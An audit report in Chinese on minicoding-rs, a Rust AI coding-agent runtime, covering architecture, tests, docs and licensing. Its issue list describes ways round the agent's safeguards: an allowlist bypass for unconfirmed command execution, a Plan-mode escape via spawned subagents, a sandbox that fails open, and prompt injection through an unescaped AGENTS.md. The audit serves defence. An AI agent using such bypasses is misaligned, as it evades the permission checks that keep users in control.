# minicoding-rs 全面深度审查报告（R10）

> 审查日期：2026-08-30
> 审查对象：`~/projects/minicoding-rs`（WSL Ubuntu-26.04），版本 **v0.3.10**，commit `b55141e`
> 代码规模：**90,906 行 Rust / 298 个 `.rs` 文件 / 18 个 workspace crate** + TypeScript 前端（83 `.ts` + 22 `.tsx`）
> 项目周期：2026-07-24 首提交 → 2026-08-30，共 **373 次提交**，主作者 1 人（368 次）
> 前置审查：本项目已有 R2–R9b 共 9 轮自审记录（`docs/project-review-*.md`）。**本报告为第 10 轮（R10），力求与既有结论不重复，聚焦新发现与未闭环项。**

---

## 0. 审查方法与证据说明

### 0.1 方法

本次审查采用"多视角并行取证 + 主审交叉验证"的方式：

1. **6 路并行深挖**：架构与模块化、Provider 与工具系统、上下文与记忆、安全（权限/沙箱/Hooks/注入）、四形态前端与 Runtime 一致性、工程化与文档。
2. **主审独立复核**：对每一条被判定为 P0/P1 的结论，主审均回到源码亲自复现证据（本报告中所有标注 **【主审核实】** 的条目，均为我本人直接读取源码确认，而非转述）。
3. **文档—代码交叉比对**：将 `docs/` 下 40+ 篇设计文档与真实代码逐条对照，量化文档漂移。
4. **度量先行**：以代码行数、依赖边、测试数、`unsafe`/`unwrap` 密度等客观指标作为判断基线，避免印象式评价。

### 0.2 本报告的可信度边界

- 所有结论均给出 `文件路径:行号`。未找到证据的推断一律归入"存疑项（B 类）"，不作为定论。
- 未执行破坏性操作、未修改任何项目文件（除新增本报告外）。
- 跨平台行为（Windows/macOS）无法在本机（Linux/WSL）实际运行验证，相关结论基于源码阅读，已在文中标注。
- 部分指标（如"`--no-default-features` 编译产物"）引用了子审查者用 `cargo tree` 的实测，主审已从 `Cargo.toml` 层面确认其成因成立。

### 0.3 问题分级标准

| 级别 | 含义 |
|------|------|
| **P0** | 安全边界被实质性击穿，或核心形态不可用。应在下个发布前修复。 |
| **P1** | 设计承诺与实现不符、重要能力缺失、或存在可触发的严重降级。应在 1–2 个迭代内修复。 |
| **P2** | 一致性/健壮性/体验缺陷，或低概率触发的问题。应排期修复。 |
| **P3** | 建议项、整洁性问题、文档漂移。 |

---

## 1. 执行摘要

### 1.1 总体判断

`minicoding-rs` 是一个**工程质量显著高于同类业余项目、但尚未达到其自我宣称的生产级安全水位**的 AI 编码助手。

它最突出的价值不在"功能比 Claude Code 多"，而在于**它把 AI Agent 的运行时抽象成了一套可替换、可审计、可嵌入的 Rust crate 体系**，并且在若干"硬骨头"上做得比多数同类项目更扎实——SSE/NDJSON 流式解析、工具调用配对完整性、SSRF + IP pinning、Hook 执行安全、JSONL 持久化与崩溃恢复、依赖方向的 CI 强制守卫。这些是真正有技术含量的部分，且都有测试支撑。

但同时，项目存在一条清晰的主线缺陷，可以概括为：

> **"文档与承诺的工程强度，显著高于实现与验证的工程强度。"**

具体表现为三个层层递进的断裂：

1. **安全承诺 vs 安全实现断裂**。README 与 `docs/innovation.md` 宣称"三平台内核级隔离""full-access 需显式确认""Plan 模式双重只读强制"，而实测结果是：Windows 侧 Job Object 不提供任何 FS/网络隔离（`is_hardened() = false` 自认）、`full-access` 的确认逻辑是零调用点死代码、Plan 模式可被 `task.spawn` 一键绕过。
2. **一致性守卫 vs 守卫有效性断裂**。项目为"双轨 Runtime 装配漂移"这个已发生过事故（R8）的问题补了守卫测试，但该测试**自身是同义反复**——它把两侧的 `register_*` 序列各自硬编码在测试体内比对，从不调用真实 builder，因此对真实漂移完全免疫（恒绿）。
3. **文档规模 vs 文档准确性断裂**。项目有 40+ 篇文档、`design.md` 单篇 19.8 万字符、`AGENTS.md` 3.2 万字符，但 `modules.md` 的模块树中"存在的"文件有 7 个不存在、实际存在的文件有 3 个未收录；`innovation.md` 把 `fail-open` 降级列为"创新点"。

这三条断裂有同一个根因：**5 周、373 次提交、单人、高强度 AI 辅助开发**。velocity 极高（约 1.8 万行/周），但验证带宽没有同步跟上——测试数量（约 1800 个）看似充足，然而覆盖分布不均，且**守卫性测试本身未经验证**。

### 1.2 关键数据

| 指标 | 实测值 | 评价 |
|------|--------|------|
| Rust 代码规模 | 90,906 行 / 298 文件 | 中大型项目 |
| crate 数（workspace 成员） | 18（+1 个 TS 前端不入 workspace） | 与 README 宣称一致 ✓ |
| 依赖图 | **严格无环**，core 出边 = 0 | 优秀 |
| 架构守卫测试覆盖 | 18/18 crate 均有 `tests/architecture.rs` | 罕见，优秀 |
| 测试函数 | 1,061 `#[test]` + 745 `#[tokio::test]` | 数量充足，分布待考 |
| 属性测试 | **3 处 `proptest!`** | 偏少 |
| `unsafe` | 104 处 | **分层后：85 处有 SAFETY 注释，约 65 处是 edition 2024 的 `set_var` 测试代码；真正的 FFI unsafe 约 36 处**（集中于 `sandbox/windows.rs` 21 处）。**纪律良好，原始计数是误读** |
| `.unwrap()` / `.expect()` | 2,209 合计 | **分层后：1,948 处（87.8%）在测试代码；非测试非入口的库代码仅 39 处，其中 18 处是 test-util harness。真正的生产 panic 点约 21 处 / 90k 行，且均带 `# Panics` 文档段。纪律教科书级，原始计数是误读** |
| `panic!`/`unreachable!`/`todo!` | 184 处 | 未逐项分层，需确认是否在生产路径 |
| LICENSE 文件 | **不存在**（git 历史中从未添加） | **P1，法律缺陷** |
| CONTRIBUTING / SECURITY / CoC | **均不存在** | P2 |
| nightly 依赖 | `rust-toolchain.toml` 钉 `nightly`；但 **`#![feature(...)]` 出现 0 次** | **开放问题**，见 §14.6 |
| 文档 : 代码 | 27,061 : 58,944 行 ≈ **1 : 2.2** | 文档密度极高，但准确性待考（见 §15） |

> **重要说明**：上表对 `unsafe` 与 `unwrap/expect` 给出了**分层后的数字**。若只看原始计数（104 / 2,209），会得出"这个项目错误处理很糟"的**错误结论**——实际上 87.8% 位于测试代码，生产 panic 点约 21 处，是相当高的纪律水平。本报告在 §14.1 对此作了完整更正。

### 1.3 问题清单（按严重度）

| ID | 级别 | 一句话结论 | 证据锚点 |
|----|------|-----------|---------|
| **R10-01** | **P0** | 只读命令白名单可被 `env`/`find`/`git config` 绕过，实现**免确认任意命令执行** | `policy/builtin.rs:145-190`【主审核实】 |
| **R10-02** | **P0** | Plan 模式硬门可被 `task.spawn` 绕过，子 Agent 在 Default 模式下自由写文件/跑 shell | `tools/task/spawn.rs:208` + `sdk/subagent.rs`【主审核实】 |
| **R10-03** | **P0** | Linux 沙箱不可用即 fail-open；`exec` 模式下沙箱失败再自动批准为 `DangerFullAccess` | `sandbox/driver.rs:53-62`、`runtime/denial.rs:81` |
| **R10-04** | **P0** | Web 形态开箱即 401，且前端**无任何 token 输入口** | `server/src/http.rs:446`、`web/src/api/client.ts:50`【主审核实】 |
| **R10-05** | **P1** | 能力漂移守卫测试是**同义反复**，从不调用真实 builder | `server/tests/architecture.rs:22-85`【主审核实】 |
| **R10-06** | **P1** | `full-access` 的"红色警告 + 二次确认"是零调用点死代码 | `policy/mode.rs:106/113` |
| **R10-07** | **P1** | AGENTS.md 注入 system prompt **未转义边界标签**，克隆不可信仓库即持久注入 | `memory/project_doc/inject.rs:61` |
| **R10-08** | **P1** | 记忆系统**无读取/删除入口**，`auto` 目标默认 `Allow` → 隐式写入不可治理 | `tools/src/memory/`（仅 write.rs） |
| **R10-09** | **P1** | 权限持久化**无 workdir 作用域、无过期**，跨项目同名路径自动放行 | `core/policy/persist.rs` |
| **R10-10** | **P1** | 输出预留硬编码 4096，与 provider 声明的 64K `max_output` 脱钩 → 真实 400 | `context/budget.rs:31`【主审核实】 |
| **R10-11** | **P1** | `context_window` 无单一事实来源；Anthropic 侧恒 200K 且**无 env 覆盖口** | `providers/anthropic.rs:252`【主审核实】 |
| **R10-12** | **P1** | 脱敏覆盖不一致：`fs.grep` 读 `.env` **不脱敏**（`fs.read` 会脱敏） | `tools/fs/grep.rs:161` |
| **R10-13** | **P1** | 沙箱覆盖面不全：`git` 子进程、MCP stdio 子进程、Hook 脚本（默认）均不在沙箱内 | 多处 |
| **R10-14** | **P1** | **无 LICENSE 文件**，但 Cargo.toml/README 均声明 AGPL-3.0-only | 仓库根目录【主审核实】 |
| **R10-15** | **P1** | CLI 的 feature 门控**整体失效**（6 个 feature 无法关闭，OTel 栈恒编入） | `cli/Cargo.toml:22/57`【主审核实】 |
| **R10-16** | **P1** | Windows "沙箱"是进程遏制而非安全边界，README "三平台内核级隔离"不成立 | `sandbox/src/windows.rs` |
| **R10-17** | **P1** | `seccomp` 从未随发布产物交付（默认关、release 不启用） | `Cargo.toml`、`release.yml`【主审核实】 |
| **R10-18** | **P2** | 双轨 Runtime 装配（sdk 1234 行 vs server 455 行），Web/Desktop 侧缺 Hooks/MCP/Extensions/AutoMemory/子 Agent | `server/runtime_builder.rs` |
| **R10-19** | **P2** | 文档漂移严重：`modules.md` 模块树 7 个文件不存在；`architecture.md` 漏 4 个 crate；`innovation.md` 对比矩阵失真 | 多文件 |
| **R10-20** | **P2** | `innovation.md` 将 **fail-open 降级**列为"创新点"（§3.4），安全价值观需修正 | `innovation.md:221` |
| **R10-21** | **P2** | `MINICODING_CONTEXT_WINDOW` 仅 OpenAI 侧实现；Ollama/Anthropic 无覆盖口 | `providers/`【主审核实】 |
| **R10-22** | **P2** | 前端版本漂移：`minicoding-web/package.json` = 0.3.9 vs workspace 0.3.10 | 【主审核实】 |
| **R10-23** | **P2** | 记忆目录权限 0755（文件 0600），会话 ID 可枚举 | `memory/`、`storage/` |
| **R10-24** | **P2** | `AutoApprovePrompter` 对**任何** prompt 恒返回 Allow，被 `minicoding exec` 使用 | `policy/prompter.rs:59-63` |

> 完整清单见 §17 风险登记册（**共 57 条**：P0 4 条、P1 17 条、P2 36 条）。

### 1.4 最值得肯定的五点

在指出问题之前，先明确记录这个项目中**真正做得好、且多数同类项目没做到**的部分：

1. **依赖方向的机器强制**。`core/src/testing/manifest_guard.rs` 扫描全部依赖表（含 `target.<cfg>.*` 与 `build-dependencies`），18/18 crate 都有 `tests/architecture.rs` 调用它，把"领域互不依赖"从文档约定升级为 CI 门禁。这是我在同类项目中很少见到的纪律水平。
2. **工具调用配对完整性**。`context/src/compress/tool_group.rs` 将"assistant(tool_calls) + 紧随的连续 tool_result"建模为原子组，L2/L3/L4 三级压缩都按组边界删除，`repair.rs` 作为发送前最后防线回填悬空调用。这是压缩功能最容易出错、也最容易被忽略的地方，本项目处理得相当扎实。
3. **SSRF 防护含 IP pinning**。`web/fetch.rs` 关闭自动重定向、逐跳重校验、`Client::resolve()` 固定 IP，消除了 DNS rebinding 窗口；`web/ssrf.rs` 覆盖 IPv4-mapped IPv6 / NAT64 / 6to4 / CGNAT。比多数同类项目完整。
4. **Hook 不是"克隆即执行"**。Hook 配置只在全局 `~/.minicoding/config.toml`，不存在项目级 Hook；项目级 MCP 有 C-24 首次批准门 + 命令指纹。这在同类工具里是少见的正确处理。
5. **重试语义幂等安全**。`providers/common/retry.rs` 只对**请求建立阶段**重试，流建立后中途错误绝不重试（注释明确"重试会重复已产出内容"），退避带 splitmix64 抖动 80~120%。这个判断是正确的，很多项目会踩坑。

---

## 2. 项目定位与差异化优势

### 2.1 定位理解

`minicoding-rs` 的自我定位（`README.md` §1、`docs/innovation.md` §1）是：

> 一个**高性能、可嵌入、可扩展、安全可控**的智能体运行时（Agent Runtime），CLI/TUI/Web/桌面都只是它的 frontend。

这个定位本身是清晰且有价值的：**它不试图做"更好的 Claude Code"，而是试图做"能长出各种 Claude Code 的运行时"**。核心差异化押注在三点——Rust 的性能与内存安全、多 crate 的可嵌入性、以及"应用层权限 + OS 级沙箱"的两道防线。

### 2.2 官方对比矩阵逐条复核

`docs/innovation.md` §12 给出了 vs Claude Code / Codex CLI / Aider 的三张对比表。我逐条与代码核验后的结果：

| 宣称的差异化 | 代码核验结果 | 判定 |
|-------------|-------------|------|
| **开源 AGPL-3.0 / 可审计** | Cargo.toml + README 均声明 `AGPL-3.0-only`，**但仓库内无 LICENSE 文件，git 历史中从未添加** | ⚠️ **声明与交付不符（R10-14）** |
| **Rust 2024 / 性能与内存安全** | edition 2024、resolver 3，成立 | ✅ 成立 |
| **多 crate workspace + 零实现 core** | 依赖图严格无环，core 出边 = 0；core 内约 4.7k 行 trait、5.4k 行 Runtime 编排。存在少量越界（`policy/persist.rs` 311 行、`provider/router.rs` 137 行、`util/slash.rs` 191 行），合计约 640 行（4%） | ✅ 基本成立（有 ARCH-1 显式豁免登记） |
| **L0/L1/L2 三层约束 + Rust 强制，抗 prompt 注入** | C-21 双重强制在代码层成立（`hooks/dispatch.rs:74` + `hooks/permission.rs:106-111`），L0 不可被 Hook 覆盖**是真的** | ✅ 成立且是真实优势 |
| **OS 内核级沙箱（seatbelt/landlock/seccomp）** | macOS 真实且完整；Linux landlock 真实但**网络面在内核 <6.7 为零、不可用即 fail-open**；**seccomp 从未随发布交付**；**Windows 非安全边界** | ❌ **仅 macOS 完全成立（R10-16/17）** |
| **4 级压缩管道 + 熔断 + 预测性 + Post-compact 恢复** | 4 级命名与顺序准确（`compress/mod.rs:84-148`），熔断状态机真实存在，tool 配对保护扎实 | ✅ 成立，但有 6 个实质缺陷（§6） |
| **类型化子 Agent + worktree 隔离** | `WorktreeSubagentRunner` 在 `sdk/builder.rs:618` 真实实例化 | ✅ 成立【主审核实】 |
| **10 类 Hook（vs CC 27 类）"精简"** | 10 类真实存在 | ⚠️ 数量差距客观存在，"精简"是**把差距重构为优势**的叙事 |
| **OTel 一等公民 + 全链路 span** | 真实接入，`rt.rs` 有 session/turn/llm/tool/permission/hook/mcp span | ✅ 成立 |
| **四形态（CLI/TUI/Web/桌面）共享后端** | **共享 crate，但不共享 Runtime 装配**：server 有独立第二套 builder，缺 Hooks/MCP/Extensions/AutoMemory/子 Agent；Web 开箱 401 | ❌ **"共享后端"名不副实（R10-04/18）** |
| **vs Codex：Windows 受限令牌** | 代码中**无 `CreateRestrictedToken`**，仅 `CreateJobObjectW`；`Cargo.toml` 描述写"Job Object + 受限令牌"但实现只有前者 | ❌ **与代码实现不符（R10-16）** |
| **可嵌入 SDK** | `sdk/src/lib.rs` 731 行公开 API，**全仓零外部消费者**；cli/tui 只共用 `builder.rs` | ⚠️ "建成未通车" |
| **`/undo` FileChangeJournal + 冲突检测** | 真实存在，默认关闭、纯内存 | ✅ 成立（范围有限） |
| **决策与交互分离（Policy vs Prompter）** | 真实且设计良好 | ✅ 成立且是真实优势 |

**结论**：14 项宣称中，**6 项完全成立、3 项基本成立、5 项与代码不符或需重大限定**。

### 2.3 真实的差异化优势（去掉水分后）

剥离营销叙事后，我认为这个项目**真正站得住、且值得保留**的差异化是：

1. **L0 硬约束在实现层强制，而非依赖 LLM 自觉**。这是本项目最实质的创新点，且代码层验证成立（`hooks/dispatch.rs:74` 会在 `builtin_deny` 时丢弃 Hook 的 Allow；`hooks/permission.rs:106-111` 在 Hook 改写输入后**重新**查询并取更严格者）。Claude Code 的等价机制主要靠 system prompt 约束。
2. **压缩时的工具调用配对原子性**。这是工程细节，但直接决定"压缩后会不会把 API 打崩"，本项目处理得比多数开源实现完善。
3. **可替换性设计本身**。Provider / 工具 / 压缩策略 / 权限策略全部 trait + 注册表，配合严格的无环依赖，使得"换掉某一层"在架构上可行。这个价值在**被嵌入**时才充分兑现。
4. **崩溃恢复与审计的完整性**。JSONL + fsync + 排他锁 + 格式版本校验 + 坏行跳过 + 4MiB 单行上限 + 锁超时，`repair.rs` 发送前修复。这一层相当扎实。

### 2.4 定位层面的风险（战略建议）

**风险 1：差异化押注在"安全"，而安全恰是当前最薄弱的环节。**

项目的核心叙事是"比 Claude Code 更安全"（L0 强制、两道防线、内核级沙箱）。但本次审查发现的 4 个 P0 中，有 3 个直接击穿安全叙事（命令白名单绕过、Plan 模式绕过、沙箱 fail-open）。对于以安全为核心卖点的产品，这个错位的杀伤力远大于功能缺失——因为用户会基于"它更安全"而放松警惕。

**建议**：在 README 与 `innovation.md` 中加入明确的**安全边界声明**（threat model + 非目标），把"我们不防什么"写清楚。这比继续加功能更能建立信任。Claude Code 自己也没有完整公开 threat model，这是一个可以真正差异化的位置。

**风险 2：四形态是成本的平方，而当前只有 1.2 个形态达到生产可用。**

CLI 可用、TUI 基本可用、Web 开箱不可用（R10-04）、Desktop 尚未验证。四形态意味着：4 套交互代码、4 套配置路径、2 套 Runtime 装配、4 倍的一致性维护成本。当前已出现的能力漂移（R10-18）和守卫失效（R10-05）正是这个成本的直接体现。

**建议**：短期内明确"CLI/TUI 为主，Web 为实验性"，并在 Web 修好前不要把它放进 README 的能力表格第一行。或者，优先合并双轨 builder（§3.3），把四形态的成本从 O(4) 降到 O(1)+O(前端)。

**风险 3：AGPL-3.0 与"可嵌入 SDK"存在内在张力。**

项目同时宣称"可嵌入 SDK"（`minicoding-sdk` 已发布到 crates.io）与"AGPL-3.0-only"。AGPL 的传染性对"被嵌入到商业产品"是实质障碍——这与"可嵌入"的核心卖点直接冲突，也解释了为什么 SDK 至今零外部消费者（可能不只是文档问题）。

**建议**：这是一个需要在 v0.4 之前明确决策的战略问题。选项：(a) 核心 crate 改 MIT/Apache-2.0 + 二进制保持 AGPL；(b) 提供商业授权例外；(c) 明确放弃"嵌入第三方闭源产品"场景，把 SDK 定位为"一等公民的 Rust API"而非第三方嵌入通道。当前状态（AGPL + 宣称可嵌入 + 零消费者）是最差的组合。

---

## 3. 模块化架构（18 crate）

### 3.1 依赖图实测

```
L0  core（出边 0，fan-in 17）
     │
L1   ├── context      ├── policy      ├── memory     ├── hooks
     ├── journal      ├── sandbox     ├── mcp        ├── storage
     ├── providers    ├── protocol    └── extension-sdk
     │
L2   ├── tools  → core, policy                    （fan-out 仅 2）
     ├── sdk    → core, policy, tools, context, storage, providers, memory
     │            + optional: hooks, journal, sandbox, extension-sdk, mcp, keyring
     └── server → core, protocol, policy, tools, context, storage,
                  providers, memory, journal, sandbox   （fan-out 10）
     │
L3   ├── cli     → core, sdk, context, policy, storage, providers, tools
     │              + optional: memory, hooks, journal, sandbox, mcp, server, extension-sdk
     ├── tui     → core, policy, sdk(default-features=false), storage
     └── desktop → core
```

**评价：依赖方向的设计与执行都是优秀的。**

- 严格无环（含 dev-dependencies 也无环，dev 边只额外加 `core[test-util]`）。
- `core` 出边为 0，且**不含** `reqwest`/`rmcp`/landlock 等重依赖（`core/Cargo.toml:11-33`），"零实现 core"的约束守得住。
- `tools` 的 fan-out 只有 2，这比文档宣称的"组合层"更好——项目用**trait 注入**替代编译期依赖（`ToolContext` 注入 `Arc<dyn Journal>` 等，未注入即 no-op），避免了 tools 变成依赖黑洞。这是个好设计，尽管它与文档不符。

### 3.2 `minicoding-core` 是否是 dumping ground？

core 15,970 行（src）的分布：

| 组成 | 行数 | 占比 | 性质 |
|------|------|------|------|
| `runtime/` 编排 | 5,388 | 33.8% | 聚合根，合理 |
| trait 定义（tool/policy/sandbox/extension/mcp/provider/hooks） | ~2,599 | 16.3% | 抽象层，合理 |
| `model/` | 1,354 | 8.5% | 数据模型，合理 |
| `hooks/trait_def.rs` | 1,096 | 6.9% | 抽象层，合理 |
| `config*` | 796 | 5.0% | 基础设施 |
| `storage/`（trait） | 883 | 5.5% | 抽象层 |
| `prompt/` | 754 | 4.7% | 实现侧 |
| `policy/` | 707 | 4.4% | **含 311 行越界实现** |
| `util/` | 747 | 4.7% | 含 191 行前端语义 |
| `metrics.rs` + `otel.rs` | 681 | 4.3% | 基础设施 |
| 其余 | ~865 | 5.4% | — |

**判定：core 不是 god crate，但是"三种职责混装"**（抽象 ≈4.7k / 编排 ≈5.4k / 基础设施 ≈2.5k）。三者各自内聚，**不建议为拆而拆**。

真正确凿的错位只有 4 处：

| 位置 | 问题 | 级别 |
|------|------|------|
| `core/src/policy/persist.rs`（311 行） | 真实文件 IO + 路径前缀匹配 + deny 优先，是领域实现而非抽象。`minicoding-policy`（4,596 行）**完全不引用它** | P2（已有 ARCH-1 豁免登记，有理有据） |
| `core/src/provider/router.rs`（137 行） | `StaticRouter` 是 `LlmProvider` 路由的**实现** | P2 |
| `core/src/util/slash.rs`（191 行） | 前端语义（斜杠命令）下沉 core；cli 与 tui 的公共分母其实是 **sdk**，不是 core | P2，建议迁 sdk |
| `core/src/metrics.rs:23-30` | 两个进程级 `static LazyLock<Mutex<BTreeMap>>`，**违反 `architecture.md:12`「组件无全局可变状态」**，并带来测试隔离风险 | P2 |

### 3.3 【R10-18】双轨 Runtime 装配——本项目的头号架构债

这是 R3→R9 四轮审查都记录过、且**至今未根治**的根因项。

**事实**：
- `crates/minicoding-sdk/src/builder.rs`（1,234 行）装配 CLI 与 TUI 的 Runtime。
- `crates/minicoding-server/src/runtime_builder.rs`（455 行）装配 Web 与 Desktop 的 Runtime。
- `runtime_builder.rs:1-17` 自述差异：**无 Hook registry、无 AutoMemory 注入、无子 Agent（`NoopSubagentRunner`）、无配置热更新**。
- `minicoding-server` 的 `Cargo.toml` 中**根本没有** `minicoding-hooks`、`minicoding-mcp`、`minicoding-extension-sdk` 三条边。

**关键发现（本次新增）**：`runtime_builder.rs:3-4` 给出的不可复用理由**已经过期**——

```rust
//! 与 `minicoding-cli::builder::build_runtime` 类似但简化——server 端无 TTY，
//! 恒用 `ServerPrompter`（HTTP 权限交互）；不依赖 `minicoding-cli`（依赖方向：
//! cli → server，不可反向）。
```

A11 重构之后，builder **已经不在 cli，而在 sdk**；而 sdk **不依赖 server**（`sdk/tests/architecture.rs` 白名单明确禁止 server/cli/tui/desktop）。因此 **`server → sdk` 完全无环，双轨并非依赖方向所迫**。

> **合并的技术障碍已被项目自己消解，剩下的只是工作量。**

**能力矩阵（依据依赖边 + 装配代码，非文档）**：

| 能力 | CLI | TUI | Web/Desktop |
|------|:---:|:---:|:-----------:|
| Hooks | ✅ | ✅ | ❌ |
| MCP 工具 | ✅ | ❌ | ❌ |
| Extensions | ✅ | ✅ | ❌ |
| AutoMemory 注入 | ✅ | ✅ | ❌ |
| 子 Agent / `task.spawn` | ✅ | ✅ | ⚠️ 注册但恒失败 |
| 配置热更新 | ✅ | ✅ | ❌ |
| undo / sandbox / plan mode / shell | ✅ | ✅ | ✅ |

**TUI 也没有 MCP**：`cli/src/main.rs:339` 与 `commands/exec.rs:157` 调用 `mcp_setup::attach_mcp_tools`，TUI 从不调用，且 `tui/Cargo.toml` 的 sdk features 列表不含 `mcp`。

**server 侧 `task.spawn` 是"僵尸工具"**（`runtime_builder.rs:369`）：注册了 `TaskSpawn`，但 runner 是 `NoopSubagentRunner`，调用必返回 `NotConfigured`。这比"不注册"更糟——schema 暴露给 LLM，模型会调用它、失败、重试，白烧 token 与用户信任。

### 3.4 【R10-05】能力漂移守卫测试是同义反复 —— 主审独立复核

R8 曾发生真实的工具缺失（git/web/memory/ui.ask 在 server 侧遗漏），R9 补了守卫测试 `capability_matrix_server_matches_sdk_assembly()`。**但该测试是无效的。**

【主审核实】两步证据：

1. **它从不调用任何真实 builder**：
   ```
   $ grep -rn "build_runtime|ServerRuntimeParams" crates/minicoding-server/tests/
   （无命中）
   ```

2. **它把两侧的 `register_*` 序列各自硬编码在测试体内**（`server/tests/architecture.rs:29-62`），然后比对两个 `BTreeSet<String>`：
   ```rust
   // SDK 装配组合（builder.rs 第 6 步）
   let mut sdk = ToolRegistry::new();
   minicoding_tools::register_readonly_tools(&mut sdk);
   minicoding_tools::register_ui_tools(&mut sdk);
   ...
   // server 装配组合（runtime_builder.rs 第 7 步）
   let mut server = ToolRegistry::new();
   minicoding_tools::register_readonly_tools(&mut server);
   ...
   assert_eq!(server_names, sdk_names, "server 与 SDK 工具集漂移：...");
   ```

两侧列表写在同一段测试代码里、内容一致 → **该断言恒真，与生产代码无关**。

**可被漏过的变更示例**（测试仍绿、Web 用户静默失去能力）：
- 从 `sdk/builder.rs:500` 删除 `register_task_tools`；
- 从 `runtime_builder.rs:281` 删除 `register_web_tools(&mut tools)`；
- 删除 `mcp_setup::attach_mcp_tools` 调用（MCP 完全不在测试覆盖内）。

**修复建议**：测试必须改为**调用真实装配函数**——把两侧的装配序列各自抽成一个返回 `ToolRegistry` 的纯函数（如 `sdk::builder::assemble_tool_registry(...)` 与 `server::runtime_builder::assemble_tool_registry(...)`），测试直接调用两者并比对。这样任何一侧增删注册都会立即红灯。此外应把 Hooks/MCP/Extensions 的**存在性**（而非工具名）也纳入断言。

### 3.5 【R10-15】CLI 的 feature 门控整体失效 —— 主审独立复核

【主审核实】`crates/minicoding-cli/Cargo.toml`：

```toml
22:  minicoding-sdk = { workspace = true }              # ← 无 default-features = false
57:  minicoding-server = { workspace = true, optional = true }   # ← 无 default-features = false
```

而 `crates/minicoding-tui/Cargo.toml:25-27` 是**正确**的，并且留下了一段说明原因的注释：

```toml
# default-features（"`default-features = false` cannot override workspace's
# `default-features`"），直接声明 path 依赖以兼容新旧两代 cargo。
minicoding-sdk = { path = "../minicoding-sdk", default-features = false, features = [
```

**后果**：

1. `sdk` 的 7 个 default features（`sandbox`/`hooks`/`file-undo`/`web`/`extensions`/`cred-keyring`/`mcp`）恒开 → cli 的 `hooks`/`file-undo`/`sandbox`/`mcp`/`extensions`/`web` 六个 feature **完全无法关闭**，`cargo build -p minicoding-cli --no-default-features` 编出的二进制里这些能力仍在线。
2. `serve` 在 cli 的 default 中（`cli/Cargo.toml:73`），而 `server/default = ["otel"]`（`server/Cargo.toml:64`）→ **OTLP 全套栈（axum/tower-http/opentelemetry-otlp）恒编入 CLI**，而 cli 自己的 `otel` feature **不在** default，`cli/src/otel_init.rs:10` 整文件 `#[cfg(feature = "otel")]`。即：**编译链接了 OTel 栈，但 CLI 永远不初始化它**。

**这个"修复不能简单加 `default-features = false`"的坑值得强调**：tui 的注释指出，当 `[workspace.dependencies]` 中的条目隐式开启 default features 时，成员 crate 通过 `workspace = true` 继承**无法**用 `default-features = false` 覆盖（cargo 的已知限制）。正确做法是像 tui 一样**直接声明 `path` 依赖**，或在 `[workspace.dependencies]` 层面就设为 `default-features = false`。这一点应写入 `AGENTS.md` 供后续维护者参考。

**附带的死依赖**（同为 A11 遗留）：`cli/Cargo.toml` 中的 `minicoding-context`、`minicoding-providers`、optional `minicoding-extension-sdk` 在 `cli/src` 内**零引用**（唯一出现是 `tests/architecture.rs` 的白名单字符串）。`memory` feature 更是纯空壳：全仓 `grep 'feature = "memory"'` 零命中，且 sdk 对 `minicoding-memory` 是**非 optional** 依赖。

**架构守卫为何抓不到**：`cli/tests/architecture.rs:6-21` 是"允许列表"式（列出允许依赖的 crate 名），只能检测**多出**的依赖，检测不到**声明了但未使用**的依赖。

### 3.6 【R10-19】文档漂移：以 `modules.md` 为例

本次审查在文档与代码之间发现大量不一致。以下为**抽样**（全部经子审查者逐条核对行号）：

| 文档位置 | 文档说法 | 实际情况 |
|---------|---------|---------|
| `modules.md:35-48` §0.2 依赖图 | `tools` 依赖 context/policy/memory/hooks/journal/sandbox/mcp/storage（8 条边） | `tools` 只依赖 core + policy；`tools/Cargo.toml:45-49` 那 5 条边是**注释掉的** |
| `modules.md:85` | "server 依赖 core + protocol + tools" | 实际 **10 条**内部边 |
| `modules.md:60` | "cli/tui/sdk 依赖 tools + core + protocol" | 三者**都不**依赖 protocol（protocol 唯一消费者是 server） |
| `modules.md:686-710` §12.2 | 列出 `args.rs`/`app.rs`/`config_loader.rs`/`render/`(4 文件)/`session/resume.rs`/`commands/audit.rs` | **全部不存在**；实际文件为 `lib.rs`/`otel_init.rs`/`builder.rs`/`commands/{backup,cred,doctor,exec,mcp,mod,serve,session_cmd}.rs`/`session/{interactive,mod}.rs` |
| `modules.md:723` | "feature gate `serve` 默认关闭" | 实际 default 含 `serve` |
| `modules.md:754` | tui 依赖含 `minicoding-cli（builder）` | tui **从不**依赖 cli（A11 后改依赖 sdk） |
| `modules.md:762-788` §14.2 | SDK API 有 `run_task(&str) -> Result<TaskReport>`、`on_event(...) -> Subscription` | 实际为 `run_task -> Result<String, SdkError>`、`subscribe() -> broadcast::Receiver<Event>`；**`TaskReport` 与 `Subscription` 类型不存在** |
| `modules.md:152-213` §1.2 | core 模块树 | 遗漏 `metrics.rs`（412 行）；树中的 `agent/worktree.rs` **不存在**（已下沉到 `tools/src/worktree.rs` 819 行）——该条 R3 的 DOC-12 于 2026-08-26 已提出，**至 2026-08-30 未修** |
| `modules.md:249-251` | prelude 示例 `pub use crate::event::Event;` / `crate::agent::TurnOutcome` | 实际为 `crate::runtime::Event` / `crate::model::TurnOutcome` |
| `modules.md:876` | `Bundled` 载体"（`host.rs` 实现）" | 实际文件是 `bundled.rs`（§17.2 自己写的是 bundled.rs） |
| `architecture.md:20-51` | 四层模型 | **完全没有** `minicoding-server`/`minicoding-protocol`/`minicoding-extension-sdk`/`minicoding-desktop` 的位置（§3.5 映射表同样只覆盖 14 个 crate） |
| `architecture.md:288-289` | "Server 模式（**后续**）"、"MCP Server（**后续**）" | **两者均已实现**（server 8,460 行含 `http.rs`/`acp.rs`/`lsp.rs`；MCP server 见 `minicoding-mcp` 的 `server` feature） |
| `architecture.md:88` | "SandboxDriver …（seccomp 待接入）" | `sandbox/src/linux.rs` 已实现，feature `seccomp` |
| `tools/src/lib.rs:23-27` | "其余工具（web/git/mcp 包装）…见 M3+/M4+" | `git/diff.rs`(364)、`git/apply.rs`(413)、`web/fetch.rs`(883)、`web/search.rs`(338) **都已落地** |

**一个讽刺性的发现**：`modules.md:232-236` §1.3 把 `core::prelude` 定义为"权威导出面（实际导出项以 lib.rs 的 pub mod prelude 为准）"。而全仓 `grep -rn "minicoding_core::prelude"` **零命中**——文档指定的权威 API 面，现实中**无人使用**，下游一律深路径引用（`use minicoding_core::` 前缀分布：model 110、provider 83、tool 48、policy 33、storage 24、runtime 21…）。这个 prelude 必然持续漂移，且目前是纯负担。

